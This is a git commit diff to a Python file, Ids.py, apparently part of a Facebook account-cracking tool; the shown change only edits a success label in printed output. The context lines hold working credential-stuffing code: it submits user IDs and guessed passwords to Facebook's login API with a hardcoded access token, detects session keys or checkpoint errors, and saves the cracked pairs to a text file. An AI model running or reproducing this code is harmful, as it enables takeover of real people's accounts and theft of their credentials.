3072fcd60ef1ac84fc2da4ef968e287efedce94f
Jobir yasir <116565947+jobiryasir@users.noreply.github.com>
2022-11-07 05:16:47 +0600

    Add files via upload

--- Ids.py
+++ Ids.py
@@ -840,13 +840,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ FH-SUCCESSFUL ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ SUCCESSFUL ] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-DX-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ FH-SUCCESSFUL ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ SUCCESSFUL ] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-DX-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
